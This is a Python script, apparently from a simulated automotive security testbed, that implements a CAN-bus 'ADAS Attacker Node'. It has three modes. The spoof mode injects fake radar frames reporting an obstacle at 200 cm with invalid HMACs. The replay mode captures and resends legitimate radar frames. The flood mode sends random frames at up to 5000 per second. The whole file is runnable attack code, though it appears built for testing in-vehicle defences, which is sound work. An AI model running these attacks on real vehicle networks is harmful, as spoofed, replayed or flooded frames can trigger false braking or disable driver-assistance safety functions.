import os
import sys
import time
import struct
import random
import logging
import argparse
import threading
import can

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common.bus import get_bus
from common.can_ids import RADAR_ID, FMT_RADAR_DATA

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

def run_attack(mode, stop_event, rate=5000, msg_callback=None):
    bus = get_bus()
    logger.info(f"Starting attacker in {mode.upper()} mode...")
    
    if mode == "spoof":
        seq = 0
        while not stop_event.is_set():
            distance_cm = 200
            rel_speed_x10 = 0
            
            payload = struct.pack(FMT_RADAR_DATA, seq, distance_cm, rel_speed_x10)
            
            invalid_hmac = bytes([random.randint(0, 255), random.randint(0, 255)])
            data = payload + invalid_hmac
            
            msg = can.Message(
                arbitration_id=RADAR_ID,
                data=data,
                is_extended_id=False
            )
            
            bus.send(msg)
            logger.info(f"[SPOOF] Sent fake radar frame (distance=200cm), seq={seq}")
            if msg_callback:
                msg_callback(msg)
                
            seq = (seq + 1) % 65536
            stop_event.wait(0.2)
            
    elif mode == "replay":
        while not stop_event.is_set():
            logger.info("[REPLAY] Waiting for a legitimate radar frame (0x100)...")
            captured_msg = None
            while not stop_event.is_set():
                msg = bus.recv(timeout=0.1)
                if msg and msg.arbitration_id == RADAR_ID:
                    captured_msg = msg
                    logger.info(f"[REPLAY] Captured frame: ID={hex(msg.arbitration_id)} Data={msg.data.hex()}")
                    break
            
            if captured_msg:
                logger.info("[REPLAY] Waiting 2 seconds before replaying...")
                stop_event.wait(2.0)
                
                if not stop_event.is_set():
                    replay_msg = can.Message(
                        arbitration_id=captured_msg.arbitration_id,
                        data=captured_msg.data,
                        is_extended_id=False
                    )
                    bus.send(replay_msg)
                    logger.info(f"[REPLAY] Replayed frame: ID={hex(replay_msg.arbitration_id)} Data={replay_msg.data.hex()}")
                    if msg_callback:
                        msg_callback(replay_msg)
                        
    elif mode == "flood":
        total_sent = 0
        start_time = time.time()
        last_log_time = start_time
        frames_this_sec = 0
        
        interval = 1.0 / rate if rate > 0 else 0
        next_send = time.time()
        
        while not stop_event.is_set():
            now = time.time()
            if now < next_send:
                time.sleep(max(0, next_send - now))
                continue
                
            next_send += interval
            
            can_id = random.randint(0x400, 0x7FE)
            data = bytes([random.randint(0, 255) for _ in range(8)])
            
            msg = can.Message(
                arbitration_id=can_id,
                data=data,
                is_extended_id=False
            )
            
            bus.send(msg)
            total_sent += 1
            frames_this_sec += 1
            if msg_callback:
                msg_callback(msg)
                
            now = time.time()
            if now - last_log_time >= 1.0:
                logger.info(f"[FLOOD] Sent {frames_this_sec} frames in the last second. Total: {total_sent}")
                frames_this_sec = 0
                last_log_time = now

    logger.info("Attacker stopped.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ADAS Attacker Node")
    parser.add_argument("--mode", choices=["spoof", "replay", "flood"], required=True, help="Attack mode")
    parser.add_argument("--rate", type=int, default=5000, help="Frames per second for flood mode (default: 5000)")
    parser.add_argument("--duration", type=int, default=10, help="Duration of the attack in seconds (default: 10)")
    
    args = parser.parse_args()
    
    stop_ev = threading.Event()
    
    attack_thread = threading.Thread(target=run_attack, args=(args.mode, stop_ev, args.rate))
    attack_thread.start()
    
    try:
        if args.duration > 0:
            time.sleep(args.duration)
            logger.info(f"Duration of {args.duration}s reached.")
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Keyboard interrupt received.")
        
    stop_ev.set()
    attack_thread.join()
    logger.info("Main thread exit.")
